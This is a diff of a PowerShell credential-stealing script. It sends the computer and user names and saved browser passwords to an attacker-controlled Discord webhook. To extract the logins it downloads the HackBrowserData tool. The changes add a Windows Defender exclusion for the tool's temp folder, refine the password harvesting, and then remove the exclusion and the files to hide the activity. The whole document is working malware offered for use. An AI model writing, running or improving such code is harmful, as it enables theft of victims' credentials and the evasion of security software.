@@ -1,5 +1,5 @@
 # Discord Webhook
-$webhook = "https://discord.com/api/webhooks/1467172875529228422/3X57JscpSXinJkZzei7XYF1JVmRx6hfSzMGx9PXOgC0Aawp4fIeN1E37Bd4OAfSJIGO0"
+$webhook = "https://discord.com/api/webhooks/1467247480428171385/TSirVX8AGKGeYAOImDkrGzyQGQjgGRMq6_E-zkv8UTIzu5jBzFGIC4ug15xtQSTys27R"
 
 # Get PC info
 $pc = "$env:COMPUTERNAME | $env:USERNAME"
@@ -22,6 +22,9 @@ $tempDir = "$env:TEMP\hbd_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 try {
+    # Add temp directory to Windows Defender exclusion
+    Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
+    
     # Download HackBrowserData
     $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
     $zipPath = "$tempDir\hbd.zip"
@@ -45,7 +48,13 @@ try {
             $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
             $browsers = ""
             foreach($item in $data) {
-                $browsers += "$($item.url)`nUser: $($item.username)`nPass: $($item.password)`n`n"
+                $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
+                $user = if($item.UserName) { $item.UserName } else { "" }
+                $pass = if($item.Password) { $item.Password } else { "" }
+                
+                if($pass) {
+                    $browsers += "$url`nUser: $user`nPass: $pass`n`n"
+                }
             }
             if(-not $browsers) { $browsers = "No saved browser passwords found" }
         } else {
@@ -59,6 +68,7 @@ try {
 }
 
 # Clean up
+Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
 Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
 # === Format and Send ===
